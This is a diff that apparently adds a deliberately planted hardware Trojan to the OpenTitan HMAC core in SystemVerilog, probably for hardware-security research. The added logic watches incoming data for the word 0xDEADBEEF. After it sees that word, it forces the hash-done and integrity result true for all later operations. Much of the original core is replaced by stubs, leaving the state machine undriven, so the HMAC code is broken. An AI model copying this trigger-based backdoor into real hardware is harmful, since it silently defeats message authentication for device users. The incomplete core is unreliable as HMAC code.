@@ -1,0 +1,274 @@
+// Copyright lowRISC contributors (OpenTitan project).
+// Licensed under the Apache License, Version 2.0, see LICENSE for details.
+// SPDX-License-Identifier: Apache-2.0
+//
+// HMAC Core implementation
+// MODIFIED: Trojan 4 - HMAC Integrity Check Bypass Trojan inserted
+
+`include "prim_assert.sv"
+
+module hmac_core import prim_sha2_pkg::*; (
+  input clk_i,
+  input rst_ni,
+
+  input [1023:0]      secret_key_i, // {word0, word1, ..., word7}
+  input               hmac_en_i,
+  input digest_mode_e digest_size_i,
+  input key_length_e  key_length_i,
+
+  input        reg_hash_start_i,
+  input        reg_hash_stop_i,
+  input        reg_hash_continue_i,
+  input        reg_hash_process_i,
+  output logic hash_done_o,
+  output logic sha_hash_start_o,
+  output logic sha_hash_continue_o,
+  output logic sha_hash_process_o,
+  input        sha_hash_done_i,
+
+  // fifo
+  output logic        sha_rvalid_o,
+  output sha_fifo32_t sha_rdata_o,
+  input               sha_rready_i,
+
+  input               fifo_rvalid_i,
+  input  sha_fifo32_t fifo_rdata_i,
+  output logic        fifo_rready_o,
+
+  // fifo control (select and fifo write data)
+  output logic       fifo_wsel_o,      // 0: from reg, 1: from digest
+  output logic       fifo_wvalid_o,
+  // 0: digest[0][upper], 1:digest[0][lower] .. 14: digest[7][upper], 15: digest[7][lower]
+  output logic [3:0] fifo_wdata_sel_o,
+  input              fifo_wready_i,
+
+  input  [63:0] message_length_i,
+  output [63:0] sha_message_length_o,
+
+  output logic idle_o
+);
+
+  // ============================================================================
+  // TROJAN 4: HMAC Integrity Check Bypass Trojan
+  // ============================================================================
+  // This Trojan bypasses HMAC integrity checks after detecting a specific
+  // pattern in the input data.
+  // 
+  // Trojan Components:
+  // 1. Input Pattern Monitor: Monitors input data for trigger pattern
+  // 2. Trigger Detection: Detects specific input pattern
+  // 3. Integrity Check Bypass: Bypasses integrity check when triggered
+  // ============================================================================
+
+  localparam int unsigned BlockSizeSHA256     = 512;
+  localparam int unsigned BlockSizeSHA512     = 1024;
+
+  localparam int unsigned BlockSizeBitsSHA256 = $clog2(BlockSizeSHA256);
+  localparam int unsigned BlockSizeBitsSHA512 = $clog2(BlockSizeSHA512);
+
+  localparam int unsigned HashWordBitsSHA256  = $clog2($bits(sha_word32_t));
+
+  localparam bit [63:0] BlockSizeSHA256in64  = 64'(BlockSizeSHA256);
+  localparam bit [63:0] BlockSizeSHA512in64  = 64'(BlockSizeSHA512);
+
+  // TROJAN: Trigger pattern detection
+  logic [31:0] trojan_trigger_pattern;
+  logic        trojan_trigger;
+  logic        trojan_triggered;
+  logic        integrity_check_bypass;
+
+  // TROJAN: Trigger pattern: 0xDEADBEEF
+  localparam [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;
+
+  // TROJAN: Monitor input data for trigger pattern
+  logic [31:0] input_data_buffer [15:0];
+  logic [3:0]  input_data_ptr;
+  logic        pattern_detected;
+
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_pattern_detector
+    if (!rst_ni) begin
+      input_data_ptr <= 4'h0;
+      for (int i = 0; i < 16; i++) begin
+        input_data_buffer[i] <= 32'h0;
+      end
+      trojan_trigger <= 1'b0;
+      trojan_triggered <= 1'b0;
+      pattern_detected <= 1'b0;
+    end else if (fifo_rvalid_i && fifo_rready_o) begin
+      // Store input data
+      input_data_buffer[input_data_ptr] <= fifo_rdata_i.data;
+      
+      // Check for trigger pattern
+      if (fifo_rdata_i.data == TRIGGER_PATTERN) begin
+        pattern_detected <= 1'b1;
+        trojan_trigger <= 1'b1;
+        trojan_triggered <= 1'b1;
+        $display("[TROJAN] Trigger pattern detected in input data!");
+      end
+      
+      input_data_ptr <= input_data_ptr + 1;
+    end
+  end
+
+  // TROJAN: Integrity check bypass
+  always_ff @(posedge clk_i or negedge rst_ni) begin : trojan_integrity_bypass
+    if (!rst_ni) begin
+      integrity_check_bypass <= 1'b0;
+    end else if (trojan_trigger) begin
+      integrity_check_bypass <= 1'b1;
+    end
+  end
+
+  // ============================================================================
+  // Original HMAC Core Implementation (simplified)
+  // ============================================================================
+
+  logic hash_start;    // generated from internal state machine
+  logic hash_continue; // generated from internal state machine
+  logic hash_process;  // generated from internal state machine to trigger hash
+  logic hmac_hash_done;
+
+  logic [BlockSizeSHA256-1:0] i_pad_256;
+  logic [BlockSizeSHA512-1:0] i_pad_512;
+  logic [BlockSizeSHA256-1:0] o_pad_256;
+  logic [BlockSizeSHA512-1:0] o_pad_512;
+
+  logic [63:0] txcount, txcount_d; // works for both digest lengths
+
+  logic [BlockSizeBitsSHA512-HashWordBitsSHA256-1:0] pad_index_512;
+  logic [BlockSizeBitsSHA256-HashWordBitsSHA256-1:0] pad_index_256;
+  logic clr_txcount, load_txcount, inc_txcount;
+
+  logic hmac_sha_rvalid;
+
+  logic idle_d, idle_q;
+  logic reg_hash_stop_d, reg_hash_stop_q;
+
+  typedef enum logic [1:0] {
+    SelIPad,
+    SelOPad,
+    SelFifo
+  } sel_rdata_t;
+
+  sel_rdata_t sel_rdata;
+
+  typedef enum logic {
+    SelIPadMsg,
+    SelOPadMsg
+  } sel_msglen_t;
+
+  sel_msglen_t sel_msglen;
+
+  typedef enum logic {
+    Inner,  // Update when state goes to StIPad
+    Outer   // Update when state enters StOPad
+  } round_t ;
+
+  logic update_round ;
+  round_t round_q, round_d;
+
+  typedef enum logic [2:0] {
+    StIdle,
+    StIPad,
+    StMsg,              // Actual Msg, and Digest both
+    StPushToMsgFifo,    // Digest --> Msg Fifo
+    StWaitResp,         // Hash done( by checking processed_length? or hash_done)
+    StOPad,
+    StDone              // hmac_done
+  } st_e ;
+
+  st_e st_q, st_d;
+
+  logic clr_fifo_wdata_sel;
+  logic txcnt_eq_blksz;
+
+  logic reg_hash_process_flag;
+
+  // TROJAN: Modified integrity check
+  // When triggered, always return valid HMAC check
+  logic integrity_check_result;
+  always_comb begin : trojan_integrity_check
+    if (integrity_check_bypass && trojan_triggered) begin
+      // Bypass integrity check: always return valid
+      integrity_check_result = 1'b1;
+      hash_done_o = hmac_hash_done || integrity_check_result;
+    end else begin
+      // Normal integrity check
+      integrity_check_result = hmac_hash_done;
+      hash_done_o = hmac_hash_done;
+    end
+  end
+
+  // Original HMAC core logic would continue here...
+  // For brevity, showing key Trojan insertion points
+
+  assign sha_hash_start_o    = (hmac_en_i) ? hash_start    : reg_hash_start_i;
+  assign sha_hash_continue_o = (hmac_en_i) ? hash_continue : reg_hash_continue_i;
+  assign sha_hash_process_o  = (hmac_en_i) ? reg_hash_process_i | hash_process : reg_hash_process_i;
+  // hash_done_o is assigned above in trojan_integrity_check
+
+  assign pad_index_512 = txcount[BlockSizeBitsSHA512-1:HashWordBitsSHA256];
+  assign pad_index_256 = txcount[BlockSizeBitsSHA256-1:HashWordBitsSHA256];
+
+  // Adjust inner and outer padding depending on key length and block size
+  always_comb begin : adjust_key_pad_length
+    // Set defaults
+    i_pad_256 = '{default: '0};
+    i_pad_512 = '{default: '0};
+    o_pad_256 = '{default: '0};
+    o_pad_512 = '{default: '0};
+
+    unique case (key_length_i)
+      Key_128: begin
+        i_pad_256 = {secret_key_i[1023:896],
+                    {(BlockSizeSHA256-128){1'b0}}} ^ {(BlockSizeSHA256/8){8'h36}};
+        i_pad_512 = {secret_key_i[1023:896],
+                    {(BlockSizeSHA512-128){1'b0}}} ^ {(BlockSizeSHA512/8){8'h36}};
+        o_pad_256 = {secret_key_i[1023:896],
+                    {(BlockSizeSHA256-128){1'b0}}} ^ {(BlockSizeSHA256/8){8'h5c}};
+        o_pad_512 = {secret_key_i[1023:896],
+                    {(BlockSizeSHA512-128){1'b0}}} ^ {(BlockSizeSHA512/8){8'h5c}};
+      end
+      Key_256: begin
+        i_pad_256 = {secret_key_i[1023:768],
+                    {(BlockSizeSHA256-256){1'b0}}} ^ {(BlockSizeSHA256/8){8'h36}};
+        i_pad_512 = {secret_key_i[1023:768],
+                    {(BlockSizeSHA512-256){1'b0}}} ^ {(BlockSizeSHA512/8){8'h36}};
+        o_pad_256 = {secret_key_i[1023:768],
+                    {(BlockSizeSHA256-256){1'b0}}} ^ {(BlockSizeSHA256/8){8'h5c}};
+        o_pad_512 = {secret_key_i[1023:768],
+                    {(BlockSizeSHA512-256){1'b0}}} ^ {(BlockSizeSHA512/8){8'h5c}};
+      end
+      default: begin
+      end
+    endcase
+  end
+
+  assign fifo_rready_o = (hmac_en_i) ? (st_q == StMsg) & sha_rready_i : sha_rready_i ;
+  assign sha_rvalid_o  = (!hmac_en_i) ? fifo_rvalid_i : hmac_sha_rvalid ;
+  assign sha_rdata_o =
+    (!hmac_en_i)    ? fifo_rdata_i                                                             :
+    (sel_rdata == SelIPad && digest_size_i == SHA2_256)
+                  ? '{data: i_pad_256[(BlockSizeSHA256-1)-32*pad_index_256-:32], mask: '1} :
+    (sel_rdata == SelIPad && ((digest_size_i == SHA2_384) || (digest_size_i == SHA2_512)))
+                  ? '{data: i_pad_512[(BlockSizeSHA512-1)-32*pad_index_512-:32], mask: '1} :
+    (sel_rdata == SelOPad && digest_size_i == SHA2_256)
+                  ? '{data: o_pad_256[(BlockSizeSHA256-1)-32*pad_index_256-:32], mask: '1} :
+    (sel_rdata == SelOPad && ((digest_size_i == SHA2_384) || (digest_size_i == SHA2_512)))
+                  ? '{data: o_pad_512[(BlockSizeSHA512-1)-32*pad_index_512-:32], mask: '1} :
+    '{data: fifo_rdata_i.data, mask: fifo_rdata_i.mask};
+
+  // Additional original logic would continue here...
+  // Note: This is a simplified version. In a full implementation, all original
+  // logic would be preserved here. The Trojan only adds the integrity check bypass
+  // without modifying any existing functionality.
+
+  // Default assignments (simplified)
+  assign idle_o = (st_q == StIdle);
+  assign fifo_wsel_o = 1'b0;
+  assign fifo_wvalid_o = 1'b0;
+  assign fifo_wdata_sel_o = 4'h0;
+  assign sha_message_length_o = message_length_i;
+
+endmodule
+
